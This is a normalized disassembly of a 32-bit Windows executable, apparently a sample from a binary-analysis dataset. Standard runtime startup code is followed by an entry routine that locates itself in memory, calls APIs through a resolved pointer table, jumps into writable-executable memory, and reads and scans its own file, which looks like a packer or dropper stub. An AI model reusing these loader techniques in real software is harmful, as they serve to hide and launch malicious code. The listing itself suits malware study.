cmp [ rw-data ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ rw-data ]
call [ _cexit@IAT ]
sub_4443eb
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x28 ]
mov [ rw-data ] eax
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push eax
call [ _exit@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ rw-data ]
call sub_444655
retn
call [ _cexit@IAT ]
sub_444427
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
push 0x2
mov [ rw-data ] eax
call [ __set_app_type@IAT ]
pop ecx
push 0xffffffff
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ _fmode@IAT ]
mov [ eax ] ecx
mov eax [ _commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call sub_4446f6
call sub_4448d0
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_4448a8
cmp [ rw-data ] 0xffffffff
jne r-xdata
push sub_4448d0
call [ __setusermatherr@IAT ]
pop ecx
xor ecx ecx
cmp [ eax + r--data ] ecx
setne cl
mov eax ecx
xor eax eax
retn
push 0xffffffff
call [ _configthreadlocale@IAT ]
pop ecx
sub_4444f8
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call _crt_debugger_hook
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call _crt_debugger_hook
pop ecx
sub_444610
push sub_444669
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_444669
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_443fba
push rw-data
call _except_handler4_common
add esp 0x18
pop ebp
retn
sub_4446a0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call ?terminate@@YAXXZ
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_4446f6
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_44471c
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_444750
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_444790
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4447e0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_444669
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_444750
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_444790
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4448a8
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call _controlfp_s
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call _invoke_watson
sub_4448d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_4449b0
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_444a60
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_444aa0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_444ad0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_44bf30
push ebp
mov ebp esp
push 0xffffffff
push sub_44bec0
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
call sub_40f1c0
mov [ ebp - 0x4 ] 0x1
mov [ rw-data ] r--data
mov [ rw-data ] rw-data
mov [ ebp - 0x4 ] 0x2
mov [ rw-data ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push sub_44c410
call sub_44418f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_44bfb0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax sub_423a40
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_423fc0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_423e80
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_423690
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424000
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424100
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424080
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424300
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_4243c0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
xor ecx ecx
mov eax sub_424d50
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424bb0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424bb0
mov [ rw-data ] ecx
mov [ rw-data ] 0x3
mov [ rw-data ] ecx
mov [ rw-data ] 0x4
mov [ rw-data ] ecx
mov [ rw-data ] 0x6
mov [ rw-data ] ecx
mov [ rw-data ] 0x9
mov [ rw-data ] ecx
mov [ rw-data ] 0xa
mov [ rw-data ] ecx
mov [ rw-data ] 0xb
mov [ rw-data ] ecx
mov [ rw-data ] 0xc
mov [ rw-data ] ecx
mov [ rw-data ] 0x11
mov [ rw-data ] ecx
mov [ rw-data ] 0x14
mov [ rw-data ] ecx
mov [ rw-data ] 0x15
mov [ rw-data ] ecx
mov [ rw-data ] 0x16
mov [ rw-data ] eax
mov [ rw-data ] ecx
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424bb0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424bb0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_4243c0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424730
mov [ rw-data ] eax
mov eax sub_424910
mov [ rw-data ] eax
mov eax sub_424b60
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424520
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424520
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_423e80
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_4246b0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_424fa0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_423fd0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] 0x18
mov [ rw-data ] ecx
mov [ rw-data ] 0x19
mov [ rw-data ] ecx
mov [ rw-data ] 0x1a
mov [ rw-data ] ecx
mov [ rw-data ] 0x1b
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] 0x1e
mov [ rw-data ] ecx
mov [ rw-data ] 0x28
mov [ rw-data ] ecx
mov [ rw-data ] 0x29
mov [ rw-data ] ecx
mov [ rw-data ] 0x2a
mov [ rw-data ] ecx
mov [ rw-data ] 0x2b
mov [ rw-data ] ecx
mov [ rw-data ] 0x3d
mov [ rw-data ] ecx
mov [ rw-data ] 0x48
mov [ rw-data ] ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x49
mov eax sub_424fd0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax sub_425030
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x35
mov [ rw-data ] ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
mov esp ebp
pop ebp
retn
sub_44c410
push ebp
mov ebp esp
push 0xffffffff
push sub_44bf00
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ rw-data ] r--data
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
call sub_403d20
mov [ rw-data ] 0x0
push rw-data
call [ DeleteCriticalSection@IAT ]
mov [ rw-data ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_46e27d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_46ee90
add esp 0x4
call sub_46f050
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_46f080
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_46f080
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_46ee90
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_46ee90
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_46ee90
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
